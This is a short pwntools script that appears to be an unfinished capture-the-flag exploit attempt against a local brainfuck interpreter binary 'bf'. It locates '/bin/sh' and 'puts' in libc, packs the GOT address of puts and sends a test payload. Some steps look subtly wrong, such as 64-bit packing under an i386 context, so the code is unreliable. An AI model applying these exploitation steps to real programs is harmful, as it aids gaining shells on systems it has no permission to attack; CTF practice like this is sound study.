from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

# Load executable
exe = ELF("./bf")

# Libc
libc = exe.libc
sh_addr = next(libc.search(b"/bin/sh"))
puts_addr = next(libc.search(b"puts"))

payload = ",.-,.\nAB\n".encode() # --> should work

got_check = p64(exe.got['puts']) # the function address in GOT

print(f"got addr: {got_check}, puts: {puts_addr}")

# Start process
conn = process("./bf") # local file
print(conn.recvline()) # receive until newline
print(conn.recvline()) # receive until newline
conn.send(payload)
output = conn.recv()
print(f"Program output: {output}") # receive until newline
#conn.recvuntil(b"result:") # receive until given keyword
#conn.send(b"-,+" + "\n" + "AB")



